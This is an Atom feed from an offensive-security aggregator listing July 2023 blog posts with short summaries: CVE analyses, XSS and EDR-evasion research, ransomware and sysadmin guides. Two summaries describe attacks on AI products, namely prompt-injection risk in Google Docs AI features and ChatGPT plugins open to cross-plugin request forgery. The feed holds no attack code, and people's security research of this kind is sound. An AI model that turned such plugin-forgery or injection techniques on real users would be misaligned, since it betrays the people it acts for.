<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://stephenbradshaw.github.io/offsecfeed/index.html</id>
    <title>osmos::feed</title>
    <updated>2023-07-13T00:48:29.932Z</updated>
    <generator>osmosfeed 1.15.1</generator>
    <link rel="alternate" href="https://stephenbradshaw.github.io/offsecfeed/index.html"/>
    <link rel="self" href="https://stephenbradshaw.github.io/offsecfeed/feed.atom"/>
    <entry>
        <title type="html"><![CDATA[Google Docs AI Features: Vulnerabilities and Risks]]></title>
        <id>https://embracethered.com/blog/posts/2023/google-docs-ai-scam/</id>
        <link href="https://embracethered.com/blog/posts/2023/google-docs-ai-scam/"/>
        <updated>2023-07-12T21:30:17.000Z</updated>
        <summary type="html"><![CDATA[Google Docs is a popular word processing tool that is used by millions of people around the world. Recently Google added new AI features to Docs (and a couple of other products), such as the ability to generate summaries, and write different kinds of creative content.
Check out Google Labs for more info.
These features can be very helpful, but they also introduce new security risks.
At the moment there are not too many degress of freedom an adversary has, but operating your AI on untrusted data can have unwanted consequences:]]></summary>
        <author>
            <name>Embrace The Red</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[kubeadm: Easily create a Kubernetes cluster]]></title>
        <id>https://4sysops.com/?p=1572510</id>
        <link href="https://4sysops.com/archives/kubeadm-easily-create-a-kubernetes-cluster/"/>
        <updated>2023-07-12T20:02:41.000Z</updated>
        <summary type="html"><![CDATA[Create Kubernetes clusters using kubeadm with this in-depth guide, exploring essential commands, the process of initializing the control plane, adding worker nodes, and performing lifecycle management.
kubeadm: Easily create a Kubernetes cluster first appeared on 4sysops.]]></summary>
        <author>
            <name>Brandon Lee</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How Private Cache Can Lead to Mass Account Takeover – pentest case]]></title>
        <id>https://research.securitum.com/?p=2020</id>
        <link href="https://research.securitum.com/how-private-cache-can-lead-to-mass-account-takeover-pentest-case/"/>
        <updated>2023-07-12T15:16:14.000Z</updated>
        <summary type="html"><![CDATA[In many situations, minor vulnerabilities might seem like small fish in the vast ocean of cybersecurity threats. They’re often marked as low severity and thus, overlooked by developers who assume that the conditions for their exploitation are too complicated to be met. However, in this article, we’re going to challenge that assumption and show you ...
The post How Private Cache Can Lead to Mass Account Takeover – pentest case appeared first on research.securitum.com.]]></summary>
        <author>
            <name>miwn</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[What we told the CFTC about blockchain threats]]></title>
        <id>https://blog.trailofbits.com/?p=104646</id>
        <link href="https://blog.trailofbits.com/2023/07/12/what-we-told-the-cftc-about-crypto-threats/"/>
        <updated>2023-07-12T11:00:13.000Z</updated>
        <summary type="html"><![CDATA[Dan Guido, CEO In March, I joined the Commodity Futures Trading Commission’s Technology Advisory Committee (TAC), helping the regulatory agency navigate the complexities of cybersecurity risks, particularly in emerging technologies like AI and blockchain. During the committee’s first meeting, I discussed how the rapidly changing and public nature of blockchain technology makes it uniquely susceptible […]]]></summary>
        <author>
            <name>Trail of Bits</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Enable Windows LAPS with Azure AD]]></title>
        <id>https://4sysops.com/?p=1572491</id>
        <link href="https://4sysops.com/archives/enable-windows-laps-with-azure-ad/"/>
        <updated>2023-07-11T20:38:40.000Z</updated>
        <summary type="html"><![CDATA[Windows Local Administrator Password Solution (Windows LAPS) is a built-in Windows feature that enables the management and rotation of local administrator passwords on Windows devices. On April 21, 2023, Microsoft released a public preview of Windows LAPS that supports Azure AD.
Enable Windows LAPS with Azure AD first appeared on 4sysops.]]></summary>
        <author>
            <name>Mohammed Kaif Joey</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Performance, Diagnostics, and WMI]]></title>
        <id>https://medium.com/p/21f3e01790d3</id>
        <link href="https://posts.specterops.io/performance-diagnostics-and-wmi-21f3e01790d3?source=rss----f05f8696e3cc---4"/>
        <updated>2023-07-11T18:11:40.000Z</updated>
        <author>
            <name>Steven F</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[The July 2023 Security Update Review]]></title>
        <id>5894c269e4fcb5e65a1ed623:58a5b38cb3db2bd67b608658:64ac6669b2d6573db3ef1636</id>
        <link href="https://www.thezdi.com/blog/2023/7/10/the-july-2023-security-update-review"/>
        <updated>2023-07-11T17:30:06.000Z</updated>
        <summary type="html"><![CDATA[It’s the second Tuesday of the month, which means Adobe and Microsoft have released their latest security patches. Take a break from your regularly scheduled activities and join us as we review the details of their latest advisories. If you’d rather watch the video recap, you can check it out here.
Apple Patches for July 2023
Apple doesn’t conform to “Patch Tuesday,” but they started things off yesterday with an emergency patch for macOS, iOS, and iPadOS. The bug in Webkit is labeled as CVE-2023-34750. Apple notes the vulnerability has been reported to be under active attack. Apple terms these emergency patches as “Rapid Security Response (RSR)” and reserves them for the most critical components where exploitation has been detected in the wild. Apple also notes this update is causing probl…]]></summary>
        <author>
            <name>Dustin Childs</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Exploiting XSS in hidden inputs and meta tags]]></title>
        <id>exploiting-xss-in-hidden-inputs-and-meta-tags</id>
        <link href="https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags"/>
        <updated>2023-07-11T13:00:00.000Z</updated>
        <summary type="html"><![CDATA[In this post we are going to show how you can (ab)use the new HTML popup functionality in Chrome to exploit XSS in meta tags and hidden inputs. It all started when I noticed the new popover behaviour]]></summary>
        <author>
            <name>PortSwigger Research</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Skip welcome page in Chrome, Edge and Firefox using Group Policy]]></title>
        <id>https://4sysops.com/?p=1572431</id>
        <link href="https://4sysops.com/archives/skip-welcome-page-in-chrome-edge-and-firefox-using-group-policy/"/>
        <updated>2023-07-10T17:59:26.000Z</updated>
        <summary type="html"><![CDATA[When a user starts a web browser for the first time on a computer, he is presented with a welcome page. Depending on the manufacturer, this page prompts for various settings that are often configured centrally in managed environments. In Chrome, Edge, and Firefox, these pages can be blocked using group policies.
Skip welcome page in Chrome, Edge and Firefox using Group Policy first appeared on 4sysops.]]></summary>
        <author>
            <name>Wolfgang Sommergut</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[What is Linux?]]></title>
        <id>https://www.sans.org/blog/what-is-linux</id>
        <link href="https://www.sans.org/blog/what-is-linux?msc=rss"/>
        <updated>2023-07-10T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Learn what Linux is, how Linux works, and why it is essential for cybersecurity professionals to learn Linux.]]></summary>
        <author>
            <name>SANS Blog</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Kubernetes guide: Taints and tolerations in Kubernetes]]></title>
        <id>https://4sysops.com/?p=1572417</id>
        <link href="https://4sysops.com/archives/kubernetes-guide-taints-and-tolerations-in-kubernetes/"/>
        <updated>2023-07-07T18:02:31.000Z</updated>
        <summary type="html"><![CDATA[In previous posts, we discussed Kubernetes Pods and Deployments. In this post, you will learn about Kubernetes taints and tolerations. These are mechanisms for controlling the nodes on which specific Pods can be scheduled. Nodes are marked with taints, and then Pods that have matching tolerations can be scheduled on those nodes.
Kubernetes guide: Taints and tolerations in Kubernetes first appeared on 4sysops.]]></summary>
        <author>
            <name>Surender Kumar</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Differential fuzz testing upgradeable smart contracts with Diffusc]]></title>
        <id>https://blog.trailofbits.com/?p=104543</id>
        <link href="https://blog.trailofbits.com/2023/07/07/differential-fuzz-testing-upgradeable-smart-contracts-with-diffusc/"/>
        <updated>2023-07-07T11:00:33.000Z</updated>
        <summary type="html"><![CDATA[By William E Bodell III (@WEBthe3rd) On March 28, 2023, SafeMoon, a self-styled “community-focused DeFi token” on Binance Smart Chain, lost the equivalent of $8.9 million in Binance Coin BNB to an exploit in a liquidity pool. The exploit leveraged a simple error introduced in an upgrade to SafeMoon’s SFM token contract, allowing the attacker […]]]></summary>
        <author>
            <name>Trail of Bits</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Cybersecurity Jobs: ICS/OT Security Assessment Consultant (Japanese)]]></title>
        <id>https://www.sans.org/blog/cybersecurity-jobs-ics-ot-security-assessment-consultant-ja</id>
        <link href="https://www.sans.org/blog/cybersecurity-jobs-ics-ot-security-assessment-consultant-ja?msc=rss"/>
        <updated>2023-07-07T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[ICS/OT セキュリティ・アセスメント・コンサルタントの主な業務や、スキルアップのためのSANSのおすすめのコースを紹介します！]]></summary>
        <author>
            <name>SANS Blog</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Cat &amp; Mouse - or Chess?]]></title>
        <id>https://s3cur3th1ssh1t.github.io/Cat_Mouse_or_Chess/</id>
        <link href="https://s3cur3th1ssh1t.github.io/Cat_Mouse_or_Chess/"/>
        <updated>2023-07-07T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Last year I had the idea for a new approach to block EDR DLLs from loading into a newly spawned process. After several months this idea lead to a PoC, which was then published after presenting the topic at x33fcon and Troopers this year. This post will cover the background and description of the technique.]]></summary>
        <author>
            <name>S3cur3Th1sSh1t</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[OpenAI Removes the "Chat with Code" Plugin From Store]]></title>
        <id>https://embracethered.com/blog/posts/2023/chatgpt-chat-with-code-plugin-take-down/</id>
        <link href="https://embracethered.com/blog/posts/2023/chatgpt-chat-with-code-plugin-take-down/"/>
        <updated>2023-07-06T23:30:00.000Z</updated>
        <summary type="html"><![CDATA[In the previous post we discussed the risks of OAuth enabled plugins being commonly vulnerable to Cross Plugin Request Forgery and how OpenAI is seemingly not enforcing new plugin store policies. As an example we explored how the “Chat with Code” plugin is vulnerable.
Recently, a post on Reddit titled “This is scary! Posting stuff by itself” shows how a conversation with ChatGPT, out of the blue (and what appears to be by accident) created a Github Issue!]]></summary>
        <author>
            <name>Embrace The Red</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[setspn: Manage service principal names in Active Directory from the command line]]></title>
        <id>https://4sysops.com/?p=1572402</id>
        <link href="https://4sysops.com/archives/setspn-manage-service-principal-names-in-active-directory-from-the-command-line/"/>
        <updated>2023-07-06T18:45:54.000Z</updated>
        <summary type="html"><![CDATA[Learn how to use the setspn command line tool to manage service principal names in Active Directory and properly configure your service accounts. The service principal name (SPN) is an often-misunderstood aspect of Active Directory Domain Services that can lead to authentication issues when improperly managed.
setspn: Manage service principal names in Active Directory from the command line first appeared on 4sysops.]]></summary>
        <author>
            <name>Brandon Lee</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[What is OPSEC?]]></title>
        <id>https://www.sans.org/blog/what-is-opsec</id>
        <link href="https://www.sans.org/blog/what-is-opsec?msc=rss"/>
        <updated>2023-07-06T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Learn what OPSEC is, why it's important in the world of OSINT, and some best practices when conducting investigations.]]></summary>
        <author>
            <name>SANS Blog</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Takeaways from a Conversation Between Hackers and Program Managers]]></title>
        <id>https://hackerone.com/best-practices/a-conversation-between-hackers-and-program-managers</id>
        <link href="https://www.hackerone.com/best-practices/a-conversation-between-hackers-and-program-managers"/>
        <updated>2023-07-05T19:00:00.000Z</updated>
        <summary type="html"><![CDATA[In recent years, HackerOne has brought hackers and customers together more frequently. Bug bounty and pentests are where these two parts of the HackerOne community have historically met, but fostering open conversations outside of paid engagements has further reinforced the sense of community and collaboration that HackerOne embodies.]]></summary>
        <author>
            <name>ktansley@hackerone.com</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[The best Docker containers]]></title>
        <id>https://4sysops.com/?p=1572384</id>
        <link href="https://4sysops.com/archives/the-best-docker-containers/"/>
        <updated>2023-07-05T18:00:37.000Z</updated>
        <summary type="html"><![CDATA[There are Docker containers available for just about any application you can think of for self-hosting. In this article, I'll look at a list of the best Docker containers.
The best Docker containers first appeared on 4sysops.]]></summary>
        <author>
            <name>Brandon Lee</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Passwordless: Can It deliver on Its promises?]]></title>
        <id>https://www.secureauth.com/?post_type=blog&amp;p=48901</id>
        <link href="https://www.secureauth.com/blog/passwordless-can-it-deliver-on-its-promises/"/>
        <updated>2023-07-05T14:46:21.000Z</updated>
        <summary type="html"><![CDATA[Despite improvements in cybersecurity, digital security breaches are as prevalent as ever. In the last month alone, data breaches have been detected at American Airlines (8,000 affected in June 27th), Mondelez (50,000 affected in June 21st), and Reddit (a ransomware attack on June 19th with a demanded payout of $4.5 million). It’s clear that threat […]
The post Passwordless: Can It deliver on Its promises? appeared first on SecureAuth.]]></summary>
        <author>
            <name>Joan Fronske</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Overview of Modern Memory Security Concerns]]></title>
        <id>https://research.nccgroup.com/?p=31732</id>
        <link href="https://research.nccgroup.com/2023/07/05/overview-of-modern-memory-security-concerns/"/>
        <updated>2023-07-05T01:00:00.000Z</updated>
        <summary type="html"><![CDATA[This article discusses the security concerns which must be taken into account whenever designing an embedded system. Failure to account for these security concerns in the system’s threat model can lead to a compromise of the most sensitive data within. Memory is a crucial part of any computer subsystem. The CPU executes instructions and operates […]]]></summary>
        <author>
            <name>Rob Wood</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Ransomware in the Cloud]]></title>
        <id>https://www.sans.org/blog/ransomware-in-the-cloud</id>
        <link href="https://www.sans.org/blog/ransomware-in-the-cloud?msc=rss"/>
        <updated>2023-07-05T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[In this blog post, we discussed the evolution of ransomware into cloud environments, the TTPs leveraged by the threat actors, and how we can defend against and prepare for such attacks.]]></summary>
        <author>
            <name>SANS Blog</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Kubernetes guide: Create a Kubernetes Service]]></title>
        <id>https://4sysops.com/?p=1572370</id>
        <link href="https://4sysops.com/archives/kubernetes-guide-create-a-kubernetes-service/"/>
        <updated>2023-07-04T14:09:36.000Z</updated>
        <summary type="html"><![CDATA[A Kubernetes Service enables network access to a set of Pods (basic Kubernetes objects) within a cluster. It provides a single stable IP address and DNS name that correspond to an evolving set of Pods, such as those resulting from a Deployment. In this post, I will explain the differences between the various types of Kubernetes Services: ClusterIP, NodePort, LoadBalancer, ExternalName, and Headless. After that, I will outline how to create a Kubernetes Service.
Kubernetes guide: Create a Kubernetes Service first appeared on 4sysops.]]></summary>
        <author>
            <name>Surender Kumar</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Find GraphQL API vulnerabilities, with Burp Suite Professional]]></title>
        <id>find-graphql-api-vulnerabilities-with-burp-suite-professional</id>
        <link href="https://portswigger.net/blog/find-graphql-api-vulnerabilities-with-burp-suite-professional"/>
        <updated>2023-07-04T13:00:00.000Z</updated>
        <summary type="html"><![CDATA[As a penetration tester, you need your tools to find the latest vulnerabilities. GraphQL APIs are widely used on today’s websites, and expose attack surface for a wide range of security issues. Burp S]]></summary>
        <author>
            <name>PortSwigger Blog</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[sec488-major-update]]></title>
        <id>https://www.sans.org/blog/sec488-cloud-security-course-updates</id>
        <link href="https://www.sans.org/blog/sec488-cloud-security-course-updates?msc=rss"/>
        <updated>2023-07-04T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Learn about the new updates to our flagship cloud security training course, SEC488, which supports our most popular cloud security certification, GCLD.]]></summary>
        <author>
            <name>SANS Blog</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Demote a domain controller step by step]]></title>
        <id>https://4sysops.com/?p=1572352</id>
        <link href="https://4sysops.com/archives/demote-a-domain-controller-step-by-step/"/>
        <updated>2023-07-03T17:38:01.000Z</updated>
        <summary type="html"><![CDATA[In this guide, you will learn how to demote a domain controller node in a Windows Server environment. I will guide you through the steps of preparation, demotion, and checks to make afterward.
Demote a domain controller step by step first appeared on 4sysops.]]></summary>
        <author>
            <name>Brandon Lee</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[We want to check out your BChecks ...]]></title>
        <id>we-want-to-check-out-your-bchecks</id>
        <link href="https://portswigger.net/blog/we-want-to-check-out-your-bchecks"/>
        <updated>2023-07-03T14:54:53.000Z</updated>
        <summary type="html"><![CDATA[Want to create customized scans without the hassle of learning advanced programming? Burp Suite's got you covered. Scripted scan checks - or BChecks - are now a full reality with the 2023.6 release of]]></summary>
        <author>
            <name>PortSwigger Blog</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Technical Advisory – Nullsoft Scriptable Installer System (NSIS) – Insecure Temporary Directory Usage]]></title>
        <id>https://research.nccgroup.com/?p=31823</id>
        <link href="https://research.nccgroup.com/2023/07/03/technical-advisory-nullsoft-scriptable-installer-system-nsis-insecure-temporary-directory-usage/"/>
        <updated>2023-07-03T13:04:38.000Z</updated>
        <summary type="html"><![CDATA[Description The NSIS uninstaller package did not enforce appropriate permissions on the temporary directory used during the uninstall process. Furthermore, it did not ensure that the temporary directory was removed before running executable content from it. This could potentially result in privilege escalation under certain scenarios. Impact A low-privileged, local attacker could exploit this vulnerability […]]]></summary>
        <author>
            <name>Rich Warren</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Technical Details of CVE-2023-30990 - Unauthenticated RCE in IBM i DDM Service]]></title>
        <id>https://blog.silentsignal.eu/2023/07/03/ibm-i-dde-vulnerability-cve-2023-30990/</id>
        <link href="https://blog.silentsignal.eu/2023/07/03/ibm-i-dde-vulnerability-cve-2023-30990/"/>
        <updated>2023-07-03T06:37:00.000Z</updated>
        <summary type="html"><![CDATA[Preface]]></summary>
        <author>
            <name>Silent Signal Techblog</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[CVE-2023-27997 Is Exploitable, and 69% of FortiGate Firewalls Are Vulnerable]]></title>
        <id>https://bishopfox.com/blog/cve-2023-27997-exploitable-and-fortigate-firewalls-vulnerable</id>
        <link href="https://bishopfox.com/blog/cve-2023-27997-exploitable-and-fortigate-firewalls-vulnerable"/>
        <updated>2023-06-30T17:00:00.000Z</updated>
        <summary type="html"><![CDATA[Check out latest analysis for CVE-2023-27997, a heap overflow in FortiOS, the the operating system behind FortiGate firewalls, that allows remote code execution.]]></summary>
        <author>
            <name>Caleb Gross</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Check the BitLocker status of all PCs in the network]]></title>
        <id>https://4sysops.com/?p=1572318</id>
        <link href="https://4sysops.com/archives/check-the-bitlocker-status-of-all-pcs-in-the-network/"/>
        <updated>2023-06-30T16:04:40.000Z</updated>
        <summary type="html"><![CDATA[The built-in tools for activating BitLocker do not provide a comprehensive report on the encryption status of the entire environment. Inactive BitLocker protection can be identified using the manage-bcd utility and PowerShell. The options for obtaining BitLocker status information through the GUI are severely limited.
Check the BitLocker status of all PCs in the network first appeared on 4sysops.]]></summary>
        <author>
            <name>Wolfgang Sommergut</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Application optimisation with LLMs: Finding faster, equivalent, software libraries.]]></title>
        <id>http://sean.heelan.io/?p=2876</id>
        <link href="https://sean.heelan.io/2023/06/30/application-optimisation-with-llms-finding-faster-equivalent-software-libraries/"/>
        <updated>2023-06-30T11:33:27.000Z</updated>
        <summary type="html"><![CDATA[A few months back I wrote a blog post where I mentioned that the least-effort/highest reward approach to application optimisation is to deploy a whole-system profiler across your clusters, look at the most expensive libraries & processes, and then search Google for faster, equivalent replacements. At Optimyze/Elastic we have had customers of our whole-system profiler […]]]></summary>
        <author>
            <name>seanhn</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Cybersecurity Jobs: Application Pen Tester (Japanese)]]></title>
        <id>https://www.sans.org/blog/cybersecurity-jobs-application-pen-tester-ja</id>
        <link href="https://www.sans.org/blog/cybersecurity-jobs-application-pen-tester-ja?msc=rss"/>
        <updated>2023-06-30T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[アプリケーションペンテスターの主な業務や、スキルアップのためのSANSのおすすめのコースを紹介します！]]></summary>
        <author>
            <name>SANS Blog</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[CVE-2023-20864: Remote Code Execution in VMware Aria Operations for Logs]]></title>
        <id>5894c269e4fcb5e65a1ed623:58a5b38cb3db2bd67b608658:649da382cfd37f6cffd4d25c</id>
        <link href="https://www.thezdi.com/blog/2023/6/29/cve-2023-20864-remote-code-execution-in-vmware-aria-operations-for-logs"/>
        <updated>2023-06-29T15:58:49.000Z</updated>
        <summary type="html"><![CDATA[In this excerpt of a Trend Micro Vulnerability Research Service vulnerability report, Jonathan Lein and Dusan Stevanovic of the Trend Micro Research Team detail a recently patched remote code execution vulnerability in VMware Aria Operations for Logs (formerly vRealize). This bug was originally submitted to the ZDI program by an anonymous researcher. The issue results from the lack of proper validation of user-supplied data, which can result in deserialization of untrusted data. An attacker can leverage this vulnerability to execute code in the context of root. Similar bugs are reported as being exploited in the wild. The following is a portion of their write-up covering CVE-2023-24941, with a few minimal modifications.
An insecure deserialization vulnerability has been reported in VMware …]]></summary>
        <author>
            <name>Dustin Childs</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Kubernetes guide: Create a Kubernetes deployment]]></title>
        <id>https://4sysops.com/?p=1572298</id>
        <link href="https://4sysops.com/archives/kubernetes-guide-create-a-kubernetes-deployment/"/>
        <updated>2023-06-29T15:24:01.000Z</updated>
        <summary type="html"><![CDATA[In a previous post of this Kubernetes guide, I discussed how to create a Pod in Kubernetes using imperative and declarative configurations. In this post, you will learn how to create a Deployment in Kubernetes. In Kubernetes, a Deployment is a resource object that defines how your application is deployed and managed in a cluster. You just need to define the desired number of instances (a.k.a. replicas) of your application, the container image, resource requirements, and other options in a configuration file, and Kubernetes takes care of deploying and managing the application.
Kubernetes guide: Create a Kubernetes deployment first appeared on 4sysops.]]></summary>
        <author>
            <name>Surender Kumar</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Anti-Scraping Part 1: Core Principles to Deter Scraping]]></title>
        <id>https://www.netspi.com/?p=30458</id>
        <link href="https://www.netspi.com/blog/technical/adversary-simulation/anti-scraping-part-1/"/>
        <updated>2023-06-29T14:00:00.000Z</updated>
        <summary type="html"><![CDATA[Part one of our anti-scraping series covers five core anti-scraping principles and how they stack up against a fake message board.
The post Anti-Scraping Part 1: Core Principles to Deter Scraping  appeared first on NetSPI.]]></summary>
        <author>
            <name>Noah Dunn</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Public Report – Zcash Zebra Security Assessment]]></title>
        <id>https://research.nccgroup.com/?p=31786</id>
        <link href="https://research.nccgroup.com/2023/06/29/public-report-zcash-zebra-security-assessment/"/>
        <updated>2023-06-29T13:06:20.000Z</updated>
        <summary type="html"><![CDATA[In Spring 2023, the Zcash Foundation engaged NCC Group to conduct a security assessment of the Zebrad application. Zebrad is a network client that participates in the Zcash consensus mechanism by validating blocks, maintaining the blockchain state (best chain and viable non-finalized chains), and gossiping blocks, transactions, and peer addresses. Five consultants performed the review, […]]]></summary>
        <author>
            <name>Parnian Alimi</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[BChecks: Houston, we have a solution!]]></title>
        <id>bchecks-houston-we-have-a-solution</id>
        <link href="https://portswigger.net/blog/bchecks-houston-we-have-a-solution"/>
        <updated>2023-06-29T12:46:10.000Z</updated>
        <summary type="html"><![CDATA[Scripted scan checks in Burp Suite Professional are now a thing ...  tl;dr Burp Suite Professional now has a powerful yet simple scripting language that allows you to quickly build on our world c]]></summary>
        <author>
            <name>PortSwigger Blog</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Avoid BitLocker recovery mode by customizing the TPM validation profile]]></title>
        <id>https://4sysops.com/?p=1572279</id>
        <link href="https://4sysops.com/archives/avoid-bitlocker-recovery-mode-by-customizing-the-tpm-validation-profile/"/>
        <updated>2023-06-28T16:26:43.000Z</updated>
        <summary type="html"><![CDATA[On startup, BitLocker ensures that the configuration of a PC has not changed since encryption began. For this purpose, it stores several system parameters in the TPM's PCR. If the PC configuration cannot be validated, BitLocker will activate Recovery Mode. By adjusting the validation profile, you can avoid this behavior.
Avoid BitLocker recovery mode by customizing the TPM validation profile first appeared on 4sysops.]]></summary>
        <author>
            <name>Wolfgang Sommergut</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Sowing Chaos and Reaping Rewards in Confluence and Jira]]></title>
        <id>https://medium.com/p/7a90ba33bf62</id>
        <link href="https://posts.specterops.io/sowing-chaos-and-reaping-rewards-in-confluence-and-jira-7a90ba33bf62?source=rss----f05f8696e3cc---4"/>
        <updated>2023-06-28T14:43:13.000Z</updated>
        <summary type="html"><![CDATA[Introducing AtlasReaper]]></summary>
        <author>
            <name>Craig Wright</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[CVE-2023-26258 – Remote Code Execution in ArcServe UDP Backup]]></title>
        <id>https://www.mdsec.co.uk/?p=3253</id>
        <link href="https://www.mdsec.co.uk/2023/06/cve-2023-26258-remote-code-execution-in-arcserve-udp-backup/"/>
        <updated>2023-06-28T13:54:56.000Z</updated>
        <summary type="html"><![CDATA[Overview During a recent adversary simulation, the MDSec ActiveBreach red team were performing a ransomware scenario, with a key objective set on compromising the organisation’s backup infrastructure. As part of...
The post CVE-2023-26258 – Remote Code Execution in ArcServe UDP Backup appeared first on MDSec.]]></summary>
        <author>
            <name>Admin</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Black Basta Ransomware]]></title>
        <id>https://www.pentestpartners.com/?p=27235</id>
        <link href="https://www.pentestpartners.com/security-blog/black-basta-ransomware/"/>
        <updated>2023-06-28T05:11:34.000Z</updated>
        <summary type="html"><![CDATA[What is Black Basta Ransomware? Black Basta is a threat group that provides ransomware-as-a-service (RaaS). The service is maintained by dedicated developers and is a highly efficient and professionally run […]
Black Basta Ransomware first appeared on Pen Test Partners.]]></summary>
        <author>
            <name>Adam Harwood</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Google Workspace Log Extraction]]></title>
        <id>https://www.sans.org/blog/google-workspace-log-extraction</id>
        <link href="https://www.sans.org/blog/google-workspace-log-extraction?msc=rss"/>
        <updated>2023-06-28T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[In this blog post, we reviewed the methods through which we can extract logs from Google Workspace. One option is to query the logs in the Admin Console, although there are several limitations that result in this not being the most ideal method. The best option to obtain the most thorough and easily parsable data is to use the Reports API in the Admin SDK. We also mentioned the use of forwarding logs to Google Cloud for a subset of audit logs to be available via Google Cloud Logging. In the last two blog posts in this series, we’ll look at how to extract logs from Microsoft 365 and Azure.]]></summary>
        <author>
            <name>SANS Blog</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Getting per-user Conditional Access MFA status in Azure]]></title>
        <id>https://research.nccgroup.com/?p=30746</id>
        <link href="https://research.nccgroup.com/2023/06/27/getting-per-user-conditional-access-mfa-status-in-azure/"/>
        <updated>2023-06-27T20:26:35.000Z</updated>
        <summary type="html"><![CDATA[Introduction Long time has passed since Microsoft implemented the first Multi-Factor Authentication (MFA) approach in Azure Active Directory with the Per-user MFA functionality [1]. However, this simple on/off mechanism has been replaced over time by the Conditional Access Policy (CAP) feature, which was released on July 2016. A conditional access policy is a set of conditions which, if matched, enforces its access […]]]></summary>
        <author>
            <name>Alberto Verza</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How-to: Reversing and debugging ISAPI modules]]></title>
        <id>https://www.skullsecurity.org/2023/how-to-reversing-and-debugging-isapi-modules</id>
        <link href="https://www.skullsecurity.org/2023/how-to-reversing-and-debugging-isapi-modules"/>
        <updated>2023-06-27T16:14:05.000Z</updated>
        <summary type="html"><![CDATA[Recently, I had the privilege to write a detailed analysis of CVE-2023-34362, which is series of several vulnerabilities in the MOVEit file transfer application that lead to remote code execution. One of the several vulnerabilities involved an ISAPI module - specifically, the MoveITISAPI.dll ISAPI extension. One of the many vulnerabilities that comprised the MOVEit RCE was a header-injection issue, where the ISAPI application parsed headers differently than the .net application. This point is going to dig into how to analyze and reverse engineer an ISAPI-based service! This wasn’t the first time in the recent past I’d had to work on something written as an ISAPI module, and each time I feel like I have to start over and remember how it’s supposed to work. This time, I thought I’d combine my hastily-scrawled notes with some Googling, and try to write something that I (and others) can use in the future. As such, this will be a quick intro to ISAPI applications from the angle that matters to me - how to reverse engineer and debug them! I want to preface this with: I’m not a Windows developer, and I’ve never run an IIS server on purpose. That means that I am approaching this with brute-force ignorance! I don’t have a lot of background context nor do I know the correct terminology for a lot of this stuff. Instead, I’m going to treat these are typical DLLs from typical applications, and approach them as such.]]></summary>
        <author>
            <name>SkullSecurity Blog</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[NetXMS: Open-source network monitoring and management]]></title>
        <id>https://4sysops.com/?p=1572267</id>
        <link href="https://4sysops.com/archives/netxms-open-source-network-monitoring-and-management/"/>
        <updated>2023-06-27T14:56:53.000Z</updated>
        <summary type="html"><![CDATA[Explore NetXMS, an enterprise-grade, open-source network monitoring and management solution with advanced features such as customized data visualization, comprehensive monitoring, and automation capabilities.
NetXMS: Open-source network monitoring and management first appeared on 4sysops.]]></summary>
        <author>
            <name>Brandon Lee</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Announcing Gato Version 1.5!]]></title>
        <id>https://www.praetorian.com/?p=4736</id>
        <link href="https://www.praetorian.com/blog/gato-update-version-1-5/"/>
        <updated>2023-06-27T13:03:35.000Z</updated>
